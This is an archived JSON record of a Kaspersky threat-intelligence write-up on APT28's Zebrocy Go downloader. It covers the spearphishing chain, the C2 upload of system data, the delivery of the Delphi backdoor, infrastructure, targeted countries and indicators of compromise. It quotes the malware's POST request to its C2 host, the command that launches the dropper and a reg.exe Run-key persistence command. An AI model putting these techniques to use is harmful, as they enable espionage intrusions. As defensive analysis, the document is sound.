{
    "id": "88f6aa67-2b3c-4b36-80c7-b5e241c104c1",
    "created_at": "2023-01-12T15:01:39.809182Z",
    "updated_at": "2025-03-27T02:17:11.39609Z",
    "deleted_at": null,
    "sha1_hash": "bd97ebf304328d37fffe9712b73f21b7edcc34be",
    "title": "2019-01-11 - A Zebrocy Go Downloader",
    "authors": "",
    "file_creation_date": "2022-05-28T02:03:40Z",
    "file_modification_date": "2022-05-28T02:03:40Z",
    "file_size": 337721,
    "plain_text": "# A Zebrocy Go Downloader\n\n**securelist.com/a-zebrocy-go-downloader/89419/**\n\nAuthors\n\nGReAT\n\n## Adding Original Findings to the Discussion\n\nLast year at [SAS2018 in Cancun, Mexico, “Masha and these Bears” included discussion of a](https://2018.sas.kaspersky.com/)\nsubset of Sofacy activity and malware that we call “Zebrocy”, and predictions for the decline\nof SPLM/XAgent Sofacy activity coinciding with the acceleration of Zebrocy activity and\ninnovation. Zebrocy was initially introduced as a Sofacy backdoor package in 2015, but the\nZebrocy cluster has carved a new approach to malware development and delivery to the\nworld of Sofacy. In line with this approach, we will present more on this Zebrocy innovation\n[and activity playing out at SAS 2019 in Singapore.](https://sas.kaspersky.com/)\n\n[Our colleagues at Palo Alto recently posted an analysis of Zebrocy malware. The analysis is](https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/)\ngood and marked their first detection of a Zebrocy Go variant as October 11, 2018. Because\nthere is much to this cluster, clarifying and adding to the discussion is always productive.\n\n\n-----\n\nOur original Zebrocy Innovates – Layered Spearphishing Attachments and Go\nDownloaders” June 2018 writeup documents the very same downloader, putting the initial\ndeployment of Zebrocy Go downloader activity at May 10, 2018. And while the targeting in\nthe May event was most likely different from the October event, we documented this same\nGo downloader and same C2 was used to target a Kyrgyzstan organization. Also interesting\nis that the exact same system was a previous Zebrocy target earlier in 2018. So, knowing\nthat this same activity is being reported on as “new” six months later tells us a bit about the\nwillingness of this group to re-use rare components and infrastructure across different\ntargets.\n\nWhile they are innovating with additional languages, as we predicted in early 2018, their\ninfrastructure and individual components may have more longevity than predicted.\nAdditionally, at the beginning of 2018, we predicted the volume of Zebrocy activity and\ninnovation will continue to increase, while the more traditional SPLM/XAgent activity will\ncontinue to decline. Reporting on SPLM/XAgent certainly has followed this course in 2018 as\nSPLM/XAgent detections wind down globally, as has Sofacy’s use of this malware from our\nperspective.\n\nMuch of the content below is reprinted from our June document.\n\nThe Sofacy subset we identify as “Zebrocy” continues to target Central Asian government\nrelated organizations, both in-country and remote locations, along with a new middle eastern\ndiplomatic target. And, as predicted, they continue to build out their malware set with a\nvariety of scripts and managed code. In this case, we see new spearphishing components –\nan LNK file maintaining powershell scripts and a Go-implemented system information\ncollector/downloader. This is the first time we have observed a well-known APT deploy\nmalware with this compiled, open source language “Go”. There is much continued recent\nZebrocy activity using their previously known malware set as well.\n\nStarting in May 2018, Zebrocy spearphished Central Asian government related targets\ndirectly with this new Go downloader. For example, the attachment name included one “30144.arj” compressed archive, an older archiver type handled by 7zip, Rar/WinRAR, and\nothers. Users found “30-144.exe” inside the archive with an altered file icon made to look like\nthe file was a Word document (regardless of the .exe file extension). And in a similar fashion\nin early June, Zebrocy spearphished over a half-dozen accounts targeting several Central\nAsian countries’ diplomatic organizations with a similar scheme “2018-05-InvitationLetter(1).rar//2018-05-Invitation-Letter(pril).docx”, sending out a more common Zebrocy\nDelphi downloader.\n\nIn other cases, delivery of the new Go downloader was not straightforward. The new Go\ndownloader also was delivered with a new spearphishing object that rolls up multiple layers\nof LNK file, powershell scripts, base64 encoded content, .docx files and the Go downloader\nfiles. The downloader is an unusually large executable at over 1.5mb, written to disk and\nlaunched by a powershell script. So the attachment that arrived over email was large.\n\n\n-----\n\nThe powershell script reads the file s contents from a very large LNK file that was included as\nan email attachment, and then writes it to disk along with a Word document of the same\nname. So, launching the downloader is followed with the opening of an identically named\ndecoy word document with “WINWORD.EXE” /n “***\\30-276(pril).docx” /o”. The downloader\ncollects a large amount of system information and POSTs it to a known Zebrocy C2, then\npulls down known Zebrocy Delphi payload code, launches it, and deletes itself.\n\nWe observed previous, somewhat similar spearphishing scenarios with an archive containing\n.LNK, .docx, and base64 encoded executable code, delivering offensive Finfisher objects in\nseparate intrusion activity clusters. This activity was not Sofacy, but the spearphishing\ntechniques were somewhat similar – the layered powershell script attachment technique is\nnot the same, but not altogether new.\n\nAnd, it is important to reiterate that these Central Asian government and diplomatic targets\nare often geolocated remotely. In the list of target geolocations, notice countries like South\nKorea, the Netherlands, etc. In addition to Zebrocy Go downloader data, this report provides\ndata on various other observed Zebrocy malware and targets over the past three months.\n\n## Spreading\n\nMostly all observed Zebrocy activity involves spearphishing. Spearphish attachments arrive\nwith .rar or .arj extensions. Filename themes include official government correspondence\ninvitations, embassy notes, and other relevant items of interest to diplomatic and government\nstaff. Enclosed objects may be LNK, docx, or exe files.\n\nA decoy PDF that directly targeted a Central Asian nation is included in one of the .arj\nattachments alongside the Go downloader. The content is titled “Possible joint projects in\ncooperation with the International Academy of Sciences” and lists multiple potential projects\nrequiring international cooperation with Tajikistan and other countries. This document\nappears to be a legitimate one that was stolen, created mid-May 2018. While we cannot\nreprint potentially leaked information publicly, clearly, the document was intended for a\nRussian-language reader.\n\n### Powershell launcher from within LNK\n\nThe LNK containing two layers of powershell script and base64 encoded content is an\nunusual implementation – contents from a couple are listed at the technical appendix. When\nopened, the script opens the shortcut file it is delivered within (“30-276(pril).docx.lnk”), pulls\nout the base64 encoded contents (in one case, from byte 3507 to byte 6708744), base64\ndecodes the content and another layer of the same powershell decoding. This script writes\ntwo files to disk as “30-276(pril).exe” and “30-276(pril).docx” and opens both files, leading to\nthe launch of the Go language system information collector/downloader and a decoy Word\ndocument.\n\n\n-----\n\n### Go System Information Collector/Downloader\n\nMd5       333d2b9e99b36fb42f9e79a2833fad9c\n\nSha256     fcf03bf5ef4babce577dd13483391344e957fd2c855624c9f0573880b8cba62e\n\nSize       1.79mb (upx packed – 3.5mb upx unpacked)\n\nCompiledOn Stomped (Wed Dec 31 17:00:00 1969)\n\nType       PE 32-bit Go executable\n\nName      30-276(pril).exe\n\nThis new Go component not only downloads and executes another Zebrocy component, but\nit enumerates and collects a fair amount of system data for upload to its C2, prior to\ndownloading and executing any further modules. It simply collects data using the systeminfo\nutility, and in turn makes a variety of WMI calls.\n\nAfter collecting system information, the backdoor calls out to POST to its hardcoded C2, in\nthis case a hardcoded IP/Url. Note that the backdoor simply uses the default Go user-agent:\n\n“POST /technet-support/library/online-service-description.php?id_name=345XXXD5\n\nHTTP/1.1\n\nHost: 89.37.226.148\n\nUser-Agent: Go-http-client/1.1”\n\nWith this POST, the module uploads all of the system information it just gathered with the\nexhaustive systeminfo utility over http: hostname, date/time, all hardware, hotfix, service and\nsoftware information.\n\nThe module then retrieves the gzip’d, better known Zebrocy dropper over port 80 as part of\nan encoded jpg file, writes it to disk, and executes from a command line:\n\n“cmd /C c:\\users\\XXX\\appdata\\local\\Identities\\{83AXXXXX-986F-1673-091A02XXXXXXXXXX}\\w32srv.exe”\n\nand adds a run key persistence entry with the system utility reg.exe:\n\ncmd /C “reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Driveupd /d\n\nc:\\users\\XXX\\appdata\\local\\Identities\\{83AXXXXX-986F-1673-091A02XXXXXXXXXX}\\w32srv.exe /f”\n\n### Zebrocy AutoIT Dropper\n\nMd5       3c58ed6913593671666283cb7315dec3\n\nSha256     96c3700ad639faa85982047e05fbd71c3dfd502b09f9860685498124e7dbaa46\n\nSize       478.5kb (upx-packed)\n\nCompiled   Fri Apr 27 06:40:32 2018\n\nType       PE32 AutoIT executable\n\nPath, Name appdata\\Identities\\{83AF1378-986F-1673-091A-02681FA62C3B}\\w32srv.exe\n\n\n-----\n\nThis AutoIT dropper writes out a Delphi payload, consistent with previous behavior going\nback to November 2015, initially described in our January 2016 report “Zebrocy – Sofacy\nAPT Deploys New Delphi Payload”.\n\n### Zebrocy Delphi Payload\n\nMd5        2f83acae57f040ac486eca5890649381\n\nSha256     f9e96b2a453ff8922b1e858ca2d74156cb7ba5e04b3e936b77254619e6afa4e8\n\nSize        786kb\n\nCompiled    Fri Jun 19 16:22:17 1992 (stomped/altered)\n\nType       PE32 exe [v4.7.7] Path, Name  c:\\ProgramData\\Protection\\Active\\armpro.exe\n\nInterestingly the final payload reverts back to an earlier version [v4.7.7]. A “TURBO”\ncommand is missing from this Zebrocy Delphi backdoor command list .\n\nSYS_INFO\n\nSCAN_ALL\n\nSCAN_LIST\n\nDOWNLOAD_DAY\n\nDOWNLOAD_LIST\n\nCREATE_FOLDER\n\nUPLOAD_FILE\n\nFILE_EXECUTE\n\nDELETE_FILES\n\nREG_WRITE_VALUE\n\nREG_READ_VALUE\n\nREG_DELETE_VALUE\n\nREG_GET_KEYS_VALUES\n\nREG_DELETE_KEY\n\nKILL_PROCESS\n\nCONFIG\n\nGET_NETWORK\n\nCMD_EXECUTE\n\nDOWNLOAD_DATE\n\nDELETE_FOLDER\n\nUPLOAD_AND_EXECUTE_FILE\n\nSCREENSHOTS\n\nFILE_EXECUTE\n\nSET_HIDDEN_ATTR\n\nSTART\n\nSTOP\n\nKILL_MYSELF\n\n## Infrastructure\n\n\n-----\n\nZebrocy backdoors are configured to directly communicate with IP assigned web server\nhosts over port 80, and apparently the group favors Debian Linux for this part of\ninfrastructure: Apache 2.4.10 running on Debian Linux. A somewhat sloppy approach\ncontinues, and the group set up and configured one of the sites with digital certificates using\na typical Sofacy-sounding domain that they have not yet registered: “weekpost.org”. Digital\ncertificate details are provided in the appendix.\n\nThese “fast setup” VPS servers run in “qhoster[.]com” can be paid for with Webmoney,\nBitcoin, Litecoin, Dash, Alfa Click, Qiwi, transfers from Sberbank Rossii, Svyaznoy,\nPromsvyazbank, and more. Although, it appears that Bitcoin and Dash may be of the most\ninterest to help ensure anonymous transactions. Dataclub provides similar payment\nmethods:\n\nOne of the VPS IP addresses (80.255.12[.]252) is hosted in the “afterburst[.]com”/Oxygem\nrange. This service is the odd one out and is unusual because it only supports VISA/major\ncredit cards and Paypal at checkout. If other payment options are provided, they are not a\npart of the public interface.\n\n## Victims and Targeting\n\nZebrocy Go downloader 2018 targets continue to be Central Asian government foreign policy\nand administrative related. Some of these organizations are geolocated in-country, or locally,\nand some are located remotely. In several cases, these same systems have seen multiple\nartefacts from Zebrocy over the course of 2017 and early 2018:\n\n- Kazakhstan\n\n- Kyrgyzstan\n\n- Azerbaijan\n\n- Tajikistan\n\nAdditional recent Zebrocy target geo-locations (targeting various Central Asian/ex-USSR\nlocal and remote government locations):\n\n- Qatar\n\n- Ukraine\n\n- Czech Republic\n\n- Mongolia\n\n- Jordan\n\n- Germany\n\n- Belgium\n\n\n-----\n\n- Iran\n\n- Turkey\n\n- Armenia\n\n- Afghanistan\n\n- South Korea\n\n- Turkmenistan\n\n- Kazakhstan\n\n- Netherlands\n\n- Kuwait\n\n- United Arab Emirates\n\n- Spain\n\n- Poland\n\n- Qatar\n\n- Oman\n\n- Switzerland\n\n- Mongolia\n\n- Kyrgyzstan\n\n- United Kingdom\n\n## Attribution\n\nZebrocy activity is a known subset of Sofacy activity. We predicted that they would continue\nto innovate within their malware development after observing past behavior, developing with\nDelphi, AutoIT, .Net C#, Powershell, and now “Go” languages. Their continued targeting,\nphishing techniques, infrastructure setup, technique and malware innovation, and previously\nknown backdoors help provide strong confidence that this activity continues to be Zebrocy.\n\n## Conclusions\n\nZebrocy continues to maintain a higher level of volume attacking local and remote ex-USSR\nrepublic Central Asian targets than other clusters of targeted Sofacy activity. Also interesting\nwith this Sofacy sub-group is the innovation that we continue to see within their malware\ndevelopment. Much of the spearphishing remains thematically the same, but the remote\nlocations of these Central Asian targets are becoming more spread out – South Korea,\nNetherlands, etc. While their focus has been on Windows users, it seems that we can expect\nthe group to continue making more innovations within their malware set. Perhaps all their\ncomponents will soon support all OS platforms that their targets may be using, including\nLinux and MacOS. Zebrocy spearphishing continues to be characteristically higher volume\nfor a targeted attacker, and most likely that trend will continue.\nAnd, as their spearphishing techniques progress to rival Finfisher techniques without\nrequiring zero-day exploitation, perhaps Zebrocy will expand their duplication of more\nsources of open source spearphishing techniques.\n\n\n-----\n\n## IoC\n\n**Go downloader**\n333d2b9e99b36fb42f9e79a2833fad9c\n\n**IPs**\n80.255.12.252\n89.37.226.148\n46.183.218.34\n185.77.131.110\n92.114.92.128\n\n**URLs**\n/technet-support/library/online-service-description.php?id_name=XXXXX\n/software-apptication/help-support-apl/getidpolapl.php\n\n**File – paths and names**\n30-276(pril).exe\n30-144-(copy).exe\nEmbassy Note No.259.docx.lnk\n2018-05-Invitation-Letter(1).rar//2018-05-Invitation-Letter(pril).docx\n\n[APT](https://securelist.com/tag/apt/)\n[Backdoor](https://securelist.com/tag/backdoor/)\n[Dropper](https://securelist.com/tag/dropper/)\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n[PowerShell](https://securelist.com/tag/powershell/)\n[Sofacy](https://securelist.com/tag/sofacy/)\n[Spear phishing](https://securelist.com/tag/spear-phishing/)\n[Targeted attacks](https://securelist.com/tag/targeted-attacks/)\n[Zebrocy](https://securelist.com/tag/zebrocy/)\n\nAuthors\n\nGReAT\n\nA Zebrocy Go Downloader\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-01-11 - A Zebrocy Go Downloader.pdf"
    ],
    "report_names": [
        "2019-01-11 - A Zebrocy Go Downloader.pdf"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535699,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653703420,
    "ts_modification_date": 1653703420,
    "files": {
        "pdf": "https://archive.orkl.eu/bd97ebf304328d37fffe9712b73f21b7edcc34be.pdf",
        "text": "https://archive.orkl.eu/bd97ebf304328d37fffe9712b73f21b7edcc34be.txt",
        "img": "https://archive.orkl.eu/bd97ebf304328d37fffe9712b73f21b7edcc34be.jpg"
    }
}